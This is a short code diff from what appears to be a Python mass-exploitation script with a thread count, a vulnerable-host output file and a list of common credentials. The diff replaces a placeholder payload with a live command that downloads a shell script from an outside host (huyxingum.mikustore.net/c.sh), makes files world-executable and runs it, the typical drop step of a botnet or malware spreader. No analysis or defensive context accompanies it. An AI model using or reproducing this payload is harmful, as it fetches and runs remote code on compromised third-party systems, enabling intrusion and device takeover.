@@ -12,7 +12,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 MAX_THREADS = 100
 VULN_OUTPUT_FILE = "hello.txt"
-PAYLOAD = "your payload here"
+PAYLOAD = "wget http://huyxingum.mikustore.net/c.sh | chmod 777 * | ./c.sh"
 
 
 COMMON_CREDS = [
